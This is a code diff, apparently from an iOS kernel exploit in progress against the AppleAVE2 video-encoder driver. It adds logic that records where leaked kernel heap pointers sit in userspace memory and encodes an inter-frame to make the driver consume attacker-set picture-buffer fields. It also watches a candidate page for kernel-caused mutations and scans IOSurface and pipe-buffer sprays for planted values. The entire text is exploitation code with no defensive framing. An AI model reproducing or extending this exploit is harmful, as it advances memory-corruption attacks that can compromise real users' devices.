@@ -161,6 +161,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     // 0) Pre-scan userspace RW memory for live ZONE_HEAP kernel pointers (e.g. 0xffffffedfd620000,
     //    0xffffffe289ee5658) so we can steer NTL directly into the live kernel heap band!
     uint64_t liveKPtrs[8] = {0};
+    vm_address_t liveVAs[8] = {0};
     int liveKPtrCount = 0;
     {
         vm_address_t addr = 0;
@@ -199,7 +200,10 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                             for (int k = 0; k < liveKPtrCount; k++) {
                                 if ((liveKPtrs[k] >> 32) == (v >> 32)) { dup = YES; break; }
                             }
-                            if (!dup) liveKPtrs[liveKPtrCount++] = v;
+                            if (!dup) {
+                                liveVAs[liveKPtrCount] = addr + off + w * sizeof(uint64_t);
+                                liveKPtrs[liveKPtrCount++] = v;
+                            }
                         }
                     }
                 }
@@ -557,15 +561,64 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             CFNumberGetValue(rbN, kCFNumberIntType, &rbPostNtl);
             CFRelease(rbN);
         }
-        [report appendFormat:@"pcontrol v3 victim=%p ntl=%d(P=0x%016llx -> x0=0x%016llx) pm=%d nPre7=%d prep=%d enc0=%d(%@) nPost=%d/%d(rb=%d)\n",
-         (void *)victim, pNtl, pFullAlign, x0ExpectedAlign, (int)pmSt, (int)nPreSt, (int)vPrep, (int)e0, cb0, (int)uPostSt, (int)nPostSt, rbPostNtl];
+
+        // Snapshot candidate 0 page (if available) before Inter-frame encode and teardown
+        vm_address_t cand0VA = (liveKPtrCount > 0) ? liveVAs[0] : 0;
+        vm_address_t candPage = cand0VA & ~(vm_address_t)0x3fffULL;
+        uint8_t candSnapBefore[0x4000] = {0};
+        uint8_t candSnapAfter[0x4000] = {0};
+        BOOL candValid = NO;
+        vm_size_t readSz = 0;
+        if (candPage && vm_read_overwrite(mach_task_self(), candPage, 0x4000,
+                                          (vm_address_t)candSnapBefore, &readSz) == KERN_SUCCESS && readSz == 0x4000) {
+            candValid = YES;
+        }
+
+        // Encode Inter-frame (Frame 1, P-frame) to force AppleAVE2 to consume UserRPSForFaceTime & DPB slot[0]
+        OSStatus eP = -1;
+        NSString *cbP = @"(no cb)";
+        CVPixelBufferRef pbP = [self makeBufferWidth:W height:H];
+        if (pbP) {
+            NSDictionary *pFrameProps = @{ (id)kVTEncodeFrameOptionKey_ForceKeyFrame: @NO };
+            eP = VTCompressionSessionEncodeFrame(victim, pbP, CMTimeMake(1, 30), kCMTimeInvalid,
+                                                 (__bridge CFDictionaryRef)pFrameProps, NULL, NULL);
+            SpriteDrain(victim, vSink, 1, 500);
+            @synchronized (vSink) {
+                if (vSink.count > 1) cbP = vSink[1];
+                else if (vSink.count == 1) cbP = vSink[0];
+            }
+            CVPixelBufferRelease(pbP);
+        }
+
+        [report appendFormat:@"pcontrol v3 victim=%p ntl=%d(P=0x%016llx -> x0=0x%016llx) pm=%d nPre7=%d prep=%d enc0=%d(%@) enc1=%d(%@) nPost=%d/%d(rb=%d)\n",
+         (void *)victim, pNtl, pFullAlign, x0ExpectedAlign, (int)pmSt, (int)nPreSt, (int)vPrep, (int)e0, cb0, (int)eP, cbP, (int)uPostSt, (int)nPostSt, rbPostNtl];
         [report appendFormat:@"pcontrol set d0(S0[1614])=%d arr4(S0[1080])=%d arr8(S0[368])=%d arr10(S0[12])=%d dpb34=%d/%d(oobPair16=0x%016llx)\n",
          (int)setD0, (int)setArr4, (int)setArr8, (int)setArr10, (int)setDpbPre, (int)setDpbPost, rbOobPair16];
-        [self journal:[NSString stringWithFormat:@"PCONTROL_V3 ntl=%d d0=%d arr4=%d arr8=%d arr10=%d dpb34=%d enc0=%d(%@)",
-                       pNtl, (int)setD0, (int)setArr4, (int)setArr8, (int)setArr10, (int)setDpbPost, (int)e0, cb0]];
+        [self journal:[NSString stringWithFormat:@"PCONTROL_V3 ntl=%d d0=%d arr4=%d arr8=%d arr10=%d dpb34=%d enc0=%d(%@) enc1=%d(%@)",
+                       pNtl, (int)setD0, (int)setArr4, (int)setArr8, (int)setArr10, (int)setDpbPost, (int)e0, cb0, (int)eP, cbP]];
         VTCompressionSessionInvalidate(victim);
         CFRelease(victim);
         CFRelease(retainedVSink);
+
+        // Check if candidate 0 remapped page changed during encode or teardown
+        int candMutations = 0;
+        if (candValid && vm_read_overwrite(mach_task_self(), candPage, 0x4000,
+                                           (vm_address_t)candSnapAfter, &readSz) == KERN_SUCCESS && readSz == 0x4000) {
+            for (size_t bo = 0; bo + 8 <= 0x4000; bo += 8) {
+                uint64_t wB = *(uint64_t *)(candSnapBefore + bo);
+                uint64_t wA = *(uint64_t *)(candSnapAfter + bo);
+                if (wB != wA) {
+                    candMutations++;
+                    if (candMutations <= 8) {
+                        [report appendFormat:@"  [!] CANDIDATE REMAP MUTATION page=0x%lx+0x%zx: 0x%016llx -> 0x%016llx\n",
+                         (unsigned long)candPage, bo, wB, wA];
+                    }
+                }
+            }
+        }
+        if (candValid) {
+            [report appendFormat:@"pcontrol candPage=0x%lx mutations=%d\n", (unsigned long)candPage, candMutations];
+        }
 
         // Scan targeted IOSurface + pipebuf spray for [x0, x0, x0, 0] at page offsets 0x58, 0x59, 0x100, 0x259
         int pcSurfHits = 0, pcPipeHits = 0, pcSigHits = 0;
